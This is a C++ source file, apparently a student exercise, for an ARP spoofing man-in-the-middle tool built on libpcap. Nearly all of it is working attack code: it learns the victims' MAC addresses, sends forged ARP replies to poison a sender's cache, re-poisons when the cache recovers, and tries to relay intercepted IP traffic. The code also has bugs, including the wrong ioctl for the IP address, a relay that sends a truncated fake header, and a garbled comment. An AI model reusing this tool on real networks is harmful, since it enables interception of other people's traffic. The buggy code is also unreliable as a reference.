#include <cstdio>
#include <pcap.h>
#include <net/if.h> // for ioctl third argument
//#include <net/if_arp.h>
#include <sys/ioctl.h> //for ioctl function
#include <sys/socket.h> //for socket
//#include <sys/types.h> //for socket
//#include <stdint.h>
#include <unistd.h> // for close function
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct Flow final {
    int index;
    Mac sender_mac;
    Ip sender_ip;
    Mac target_mac;
    Ip target_ip;
} Flow;

typedef struct Attacker final {
    Mac mac;//attacker_mac
    Ip ip;//attacker_ip
} Attacker;

typedef struct IpPacket final {
    EthHdr eth_;
    Ip source_ip;
    Ip destination_ip;
    //Mac source_mac;
    //Mac destination_mac;
} IpPacket;

void getAttacker_info(char* interface);
Mac getTarget_mac(pcap_t* handle, Ip& tip);//to get sender(target), target(target) mac address by attacker(sender)
void attack_ARPspoofing(pcap_t* handle, Flow *flow);
void ARP_infect(pcap_t* handle, Flow *flow);
bool ARP_Recover(const u_char* pcap_packet, Flow *flow);
bool Spoofed_IP(const u_char* pcap_packet, Flow *flow);
void Relay_IP(pcap_t* handle, Flow *flow);

Attacker attacker;

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 == 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);//for packet pcap_next_ex
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }
    pcap_close(handle);

    // get attacker info
    getAttacker_info(dev);
    printf("Attacker MAC = %s\n", std::string(attacker.mac).c_str());
    printf("Attacker IP = %s\n", std::string(attacker.ip).c_str());

    // (sender, target) flow multiple input
    int cnt = (argc - 2)/2;
    Flow flows[cnt];

    int index = 0;
    for(int i = 2; i < argc; i += 2){
        flows[index].index = index;
        flows[index].sender_ip = Ip(argv[i]);
        flows[index].target_ip = Ip(argv[i+1]);
        printf("flows[index].sender_ip = %s\n", std::string(flows[index].sender_ip).c_str());
        printf("flows[index].target_ip = %s\n", std::string(flows[index].target_ip).c_str());

        ++index;
    }

    for(int i = 0; i < index; i++){
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);//for packet pcap_next_ex

        //get sender mac address(ARP Request)
        flows[i].sender_mac = getTarget_mac(handle, flows[i].sender_ip);//attacker is sender, sender is target
        printf("[%d] Sender MAC = %s\n", flows[i].index, std::string(flows[i].sender_mac).c_str());//&smac->warning

        //get target mac address(ARP Request)
        flows[i].target_mac = getTarget_mac(handle, flows[i].target_ip);//attacker is sender, target is target
        printf("[%d] Target MAC = %s\n", flows[i].index, std::string(flows[i].target_mac).c_str());//&smac->warning

        //ARP Spoofing
        printf("attack_ARPspoofing start\n");
        attack_ARPspoofing(handle, &flows[i]);
        printf("attack_ARPspoofing finish\n");

        pcap_close(handle);
    }

    return 0;
}

void getAttacker_info(char* interface)
{
    uint8_t attacker_mac[6];//MAC_ALEN=6
    char attacker_ip[20];

    struct ifreq ifr;
    int sock;

    //open network interface socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);//AF_INET or AF_PACKET, SOCK_DGRAM or SOCK_STREAM
    if(sock < 0){
        perror("Fail to socket()");
        close(sock);
        exit(-1);
    }

    //check the mac address of the network interface
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);//strcpy(ifr.ifr_name, interface); -> warning
    if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0){
        perror("Fail ioctl() to get interface MAC address");
        close(sock);
        exit(-1);
    }
    memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);

    //check the ip address of the network interface
    if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0){
        perror("Fail ioctl() to get interface IP address");
        close(sock);
        exit(-1);
    }
    struct sockaddr_in *addr;
    addr = (struct sockaddr_in*)&ifr.ifr_addr;
    memcpy(attacker_ip, inet_ntoa(addr->sin_addr), sizeof(ifr.ifr_addr));
    //inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, attacker_ip, sizeof(struct sockaddr));

    //close network interface socket
    close(sock);

    attacker.mac = Mac(attacker_mac);
    attacker.ip = Ip(attacker_ip);
}

Mac getTarget_mac(pcap_t* handle, Ip& tip)//send arp request packet(sender -> broadcast) to get target mac address(for arp reply packet)
{
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();//Mac("ff:ff:ff:ff:ff:ff") = Mac::broadcastMac()
    packet.eth_.smac_ = attacker.mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attacker.mac;
    packet.arp_.sip_ = htonl(attacker.ip);
    packet.arp_.tmac_ = Mac::nullMac();//Mac("00:00:00:00:00:00") = Mac::nullMac()
    packet.arp_.tip_ = htonl(tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }

    //get sender mac address(ARP Reply)
    EthArpPacket reply_packet;

    while(1){
        struct pcap_pkthdr* header;
        const u_char* pcap_packet;
        int res = pcap_next_ex(handle, &header, &pcap_packet);
        if(res == 0)
            continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }

        reply_packet = *(EthArpPacket*)pcap_packet;
        if(reply_packet.eth_.type() != EthHdr::Arp)
            continue;
        if(reply_packet.arp_.op() != ArpHdr::Reply)
            continue;

        return Mac(reply_packet.arp_.smac());

        //reply_packet = *(EthArpPacket*)pcap_packet;
        //if(reply_packet.eth_.type_ == htons(EthHdr::Arp)){
        //    if(reply_packet.arp_.op_ == htons(ArpHdr::Reply)){
        //        printf("ARP Reply!\n\n");
        //        return Mac(reply_packet.arp_.smac());
        //    }
        //}
        //sleep(2);
    }
}
void attack_ARPspoofing(pcap_t* handle, Flow *flow)
{
    //ARP infect packet(Reply ARP Packet: attacker->sender)
    ARP_infect(handle, flow);
    printf("[%d] Sender infected\n", flow->index);

    //ARP Recover -> Reinfect, Spoofed IP Packet -> Relay IP Packet
    while(1){
        struct pcap_pkthdr* header;
        const u_char* pcap_packet;
        int res = pcap_next_ex(handle, &header, &pcap_packet);
        if(res==0)
            continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }

        printf("ARP_Recover start\n");
        printf("Spoofed_IP start\n");
        if(ARP_Recover(pcap_packet, flow)){//ARP Recover
            //Reinfect
            ARP_infect(handle, flow);
            printf("[%d] Detect Recover : Sender reinfected\n", flow->index);
        }
        else if(Spoofed_IP(pcap_packet, flow)){//Spoofed IP Packet
            //Relay IP Packet
            Relay_IP(handle, flow);
            printf("[%d] Detect Spoofed IP : Relay IP\n", flow->index);
        }
        printf("ARP_Recover finish\n");
        printf("Spoofed_IP finish\n");
        sleep(5);
    }
}
void ARP_infect(pcap_t* handle, Flow *flow)
{
    EthArpPacket spoofing_packet;

    spoofing_packet.eth_.dmac_ = flow->sender_mac;
    spoofing_packet.eth_.smac_ = attacker.mac;
    spoofing_packet.eth_.type_ = htons(EthHdr::Arp);

    spoofing_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    spoofing_packet.arp_.pro_ = htons(EthHdr::Ip4);
    spoofing_packet.arp_.hln_ = Mac::SIZE;
    spoofing_packet.arp_.pln_ = Ip::SIZE;
    spoofing_packet.arp_.op_ = htons(ArpHdr::Reply);
    spoofing_packet.arp_.smac_ = Mac(attacker.mac);
    spoofing_packet.arp_.sip_ = htonl(flow->target_ip);
    spoofing_packet.arp_.tmac_ = flow->sender_mac;
    spoofing_packet.arp_.tip_ = htonl(flow->sender_ip);

    //send spoofing arp reply packet
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofing_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
bool ARP_Recover(const u_char* pcap_packet, Flow *flow)//target -> sender reply packet
{
    EthArpPacket* recover_packet = (EthArpPacket*)pcap_packet;

    //printf("recover_packet->eth_.smac() = %s\n", std::string(recover_packet->eth_.smac()).c_str());
    //printf("recover_packet->eth_.dmac() = %s\n", std::string(recover_packet->eth_.dmac()).c_str());
    //printf("recover_packet->eth_.type() = %u\n", recover_packet->eth_.type());
    //printf("recover_packet->arp_.smac() = %s\n", std::string(recover_packet->arp_.smac()).c_str());
    //printf("recover_packet->arp_.sip() = %s\n", std::string(recover_packet->arp_.sip()).c_str());
    //printf("recover_packet->arp_.tmac() = %s\n", std::string(recover_packet->arp_.tmac()).c_str());
    //printf("recover_packet->arp_.tip() = %s\n", std::string(recover_packet->arp_.tip()).c_str());

    if(recover_packet->eth_.type() != EthHdr::Arp)
        return false;
    if(recover_packet->arp_.op() != ArpHdr::Reply)
        return false;

    return true;
}
bool Spoofed_IP(const u_char* pcap_packet, Flow *flow)
{
    //send spoofed ip packet(sender -> attackvoid Relay_IP(pcap_t* handle, Flow *flow)er)
    IpPacket* spoofed_packet = (IpPacket*)pcap_packet;
    if(spoofed_packet->eth_.type() != EthHdr::Ip4)
        return false;
    //if(spoofed_packet->eth_.smac() != flow->sender_mac)
    //    return false;

    return true;
}
void Relay_IP(pcap_t* handle, Flow *flow)
{
    //send reply ip packet(attacker -> target)
    IpPacket relay_packet;

    relay_packet.eth_.dmac_ = flow->target_mac;
    relay_packet.eth_.smac_ = attacker.mac;
    relay_packet.source_ip = flow->sender_ip;

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&relay_packet), sizeof(IpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
